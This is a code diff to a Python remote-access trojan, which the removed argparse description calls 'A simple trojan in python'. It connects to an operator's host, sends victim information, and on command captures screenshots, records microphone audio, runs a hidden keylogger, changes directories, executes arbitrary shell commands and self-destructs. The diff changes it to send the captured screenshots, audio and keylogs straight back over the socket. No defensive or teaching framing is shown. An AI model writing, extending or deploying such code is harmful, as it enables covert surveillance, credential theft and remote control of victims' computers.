@@ -52,7 +52,7 @@ audio_samplerate = 44100
 
 
 
-parser = argparse.ArgumentParser(prog="Just a kiddie", description="A simple trojan in python")
+parser = argparse.ArgumentParser(prog="Just a kiddie")
 parser.add_argument('--host', required=True)
 parser.add_argument('--port', required=True, type=int)
 
@@ -63,6 +63,11 @@ class Color(StrEnum):
     GREEN  = "\033[92m"
     RESET  = "\033[0m"
 
+
+
+
+def get_banner(type, length, extra):
+    return f"{type}|{length}|{extra}\n"
 
 
 def _timestamp():
@@ -171,15 +176,17 @@ def listen_audio():
     return recording
 
 
-def save_rec(audio,base):
+def save_rec(audio):
     filename = "audio_" + _timestamp() + ".wav"
-    path = os.path.join(base, "audio", filename)
+    buf = io.BytesIO()
     
-    with wave.open(path, "w") as wav_file:
+    with wave.open(buf, "wb") as wav_file:
         wav_file.setnchannels(2)
         wav_file.setsampwidth(2)        
         wav_file.setframerate(audio_samplerate)
         wav_file.writeframes(audio.tobytes())
+
+    return filename, buf.getvalue()
 
 
 def listen_keyboard(client):
@@ -202,7 +209,14 @@ def listen_keyboard(client):
     ctypes.windll.kernel32.SetFileAttributesW(KEYLOG_PATH, 2)
 
     with open(KEYLOG_PATH, "rb") as f:
-        client.send(f.read())
+        data = f.read()
+
+    send_packet(
+        client=client, 
+        type="TMP", 
+        filename=os.path.basename(KEYLOG_PATH), 
+        data=data
+    )
 
 
 def take_screenshot():
@@ -214,22 +228,22 @@ def take_screenshot():
     
     return filename, buf.getvalue()
     
-    
-def save_received(base, category, filename, data):
-    path = os.path.join(base, category, filename)
 
-    with open(path, "wb") as f:
-        f.write(data)
+def send_packet(client: socket.socket , type, filename, data):
+    try:
+        banner = get_banner(type, len(data), filename)
+
+        client.send(banner.encode())
+        client.send(data)
+
+        return True
     
+    except Exception as e:
+        return False
     
-def setup_storage(victim_id):
-    base = os.path.join("loot", victim_id)
-    
-    os.makedirs(os.path.join(base, "screenshots"), exist_ok=True)
-    os.makedirs(os.path.join(base, "audio"), exist_ok=True)
-    os.makedirs(os.path.join(base, "keylogs"), exist_ok=True)
-    
-    return base
+
+def send_text(client, text):
+    send_packet(client, "TEXT", "none", text.encode())
 
 
 def auto_destroy():
@@ -247,7 +261,6 @@ def main(host, port):
     
     client = connect(host, port)
     info = collect_victim_info()
-    base = setup_storage(info["vic_id"])
     client.send(json.dumps(info).encode())
 
 
@@ -255,32 +268,57 @@ def main(host, port):
         command = client.recv(1024).decode()
 
         match command:  
-            case "screenshot":
+            case "/screenshot":
                 filename, data = take_screenshot()
-                client.send(data)
+                send_packet(
+                    client=client, 
+                    type="PNG", 
+                    filename=filename,
+                    data=data
+                )
                 
-            case "audio":
+            case "/audio":
                 audio = listen_audio()
-                save_rec(audio, base)
+                filename, data = save_rec(audio)
+                send_packet(
+                    client=client,
+                    type="WAV",
+                    filename=filename,
+                    data=data
+                )
 
-            case "keylog":
+            case "/keylog":
                 if not keylogger_active:
                     threading.Thread(target=listen_keyboard, args=(client,), daemon=True).start()
 
-            case "kill":
+            case "/kill":
                 auto_destroy()
                 break
             
-            case "download":
-                pass
-            
+            case _ if command.startswith("cd "):
+                try:
+                    destiny = command.split()[1]
+                    
+                    os.chdir(destiny)
+                    cwd = os.getcwd()
+                    
+                    send_packet(
+                        client=client, 
+                        type="CWD", 
+                        filename=cwd, 
+                        data=b"ok"
+                    )
+
+                except FileNotFoundError | NotADirectoryError:
+                    send_text(client, "[!] Directory not found.")
+                except PermissionError:
+                    send_text(client, "[!] Permission error.")
+
             case _:
                 output, err = cmd(command)
-                
-                if err:
-                    client.send(err.encode())
-                else:
-                    client.send(output.encode())
+                result = err if err else output
+
+                send_text(client, result)
 
 
 if __name__ == "__main__":
